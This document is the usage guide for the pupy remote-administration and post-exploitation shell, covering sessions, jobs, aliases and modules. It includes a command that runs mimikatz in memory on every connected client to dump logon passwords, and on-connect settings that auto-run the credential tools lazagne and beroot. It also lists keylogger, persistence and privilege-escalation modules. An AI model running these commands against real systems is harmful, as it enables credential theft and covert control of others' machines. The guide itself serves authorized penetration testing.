## List commands and modules
To list all commands and aliases use the following command:
```code
>> help
```

For a complete list of modules, run:
```code
>> help -M
```

## Find commands and modules help
First of all it is important to know that nearly all commands in pupy have a help builtin. So if at any moment you are wondering what a command does you can type your command followed by `-h` or `--help`.
```code
>> sessions -h
>> jobs -h
>> run -h
```

For example if you want to know how to use the pyexec module type :
```code
>> pyexec -h
usage: pyexec [-h] [--file <path>] [-c <code string>]

execute python code on a remote system 

optional arguments:
-h, --help            show this help message and exit
--file <path>         execute code from .py file
-c <code string>, --code <code string>
                      execute python oneliner code. ex : 'import
                      platform;print platform.uname()'
```

## Use the completion !
Nearly all commands and modules in pupy have custom auto-completion. So if you are wondering what you need to type just press TAB
```code
>> run 
getsystem           load_package        msgbox              ps                  shell_exec          
download            interactive_shell   memory_exec         persistence         pyexec              shellcode_exec      
exit                keylogger           migrate             port_scan           pyshell             socks5proxy         
get_info            linux_pers          mimikatz            portfwd             screenshot          upload              
getprivs            linux_stealth       mouselogger         process_kill        search              webcamsnap          
>> load_package 
_sqlite3           linux_stealth      psutil             pupyimporter       pyshell            sqlite3            
interactive_shell  netcreds           ptyshell           pupymemexec        pywintypes27.dll   vidcap             
linux_pers         portscan           pupwinutils        pupyutils          scapy   
```


```code
>> pyexec -
--code   --file   --help   -c       -h       
>> run pyexec --file /
/bin/         /etc/         /lib/         /libx32/      /media/       /proc/        /sbin/        /sys/         /var/         
/boot/        /home/        /lib32/       /live-build/  /mnt/         /root/        /share/       /tmp/         /vmlinuz      
/dev/         /initrd.img   /lib64/       /lost+found/  /opt/         /run/         /srv/         /usr/         
```

## Escape your arguments
Every command in pupy shell uses a unix-like escaping syntax. If you need a space in one of your arguments you need to put your argument between quotes.
```code
>> shell_exec 'tasklist /V'
```

If you send a Windows path, you need to double the backquotes or put everything between quotes.
```code
>> download 'C:\Windows\System32\cmd.exe'
```

or
```code
>> download C:\\Windows\\System32\\cmd.exe
```

## Create Aliases
Modules aliases can be defined in the `pupy.conf` file. If you define the following alias :
```code
shell=interactive_shell
```

As an example, defining the following alias will add a command to kill the pupy client's process with signal 9:
```code
killme = pyexec -c 'import os;os.kill(os.getpid(),9)'
```

## Jobs
Some modules like `socks5proxy` or `portfwd` automatically start as jobs, but all modules can be run as jobs when used with the `--bg` argument.
```code
>> run --bg shell_exec 'tasklist /V'
[%] job < shell_exec ['tasklist /V'] > started in background !
```

The jobs output can be retrieved at any moment by using the `jobs -p` command. From the `jobs` command you can also list jobs status and kill jobs.
```code
>> jobs 
usage: jobs [-h] [-k <job_id>] [-l] [-p <job_id>]

list or kill jobs

optional arguments:
-h, --help            show this help message and exit
-k <job_id>, --kill <job_id>
print the job current output before killing it
-l, --list            list jobs
-p <job_id>, --print-output <job_id>
						print a job output
```

Regular jobs can be set in Linux/Unix environments by running your `pupysh.py` script inside the Screen utility. You can then setup cronjobs to run the below command at whatever intervals you require, this essentially pastes the input after the word 'stuff' into the screen session. Replace 1674 with the ID of your screen session, the echo command is the Enter key being pressed.
```code
screen -S 1674 -X stuff 'this is an example command'$(echo -ne '\015')
```

## Handle multiple clients connected
By default pupy launch every module you run on all connected clients. This allows for example to run mimikatz on all connected clients and dump passwords everywhere in one command
```code
>> run memory_exec /usr/share/mimikatz/Win32/mimikatz.exe privilege::debug sekurlsa::logonPasswords exit
```

- To interact with session 1
```code
>> sessions -i 1
```

- To interact with all windows 7 only:
```code
>> sessions -i 'platform:Windows release:7'
```

## Run commands after getting a new session
To run these modules for each new sessions, all commands should start by **any** (or by *) and should have different names.
```
[on_connect]
any_1 = beroot
any_2 = lazagne
```

Another way should be to include an entire category like so
```
[on_connect]
* = include:default_commands

[default_commands]
any_1 = beroot
any_2 = lazagne
```

## Run local commands
Start your command with a `!`
```
>> !ls
```

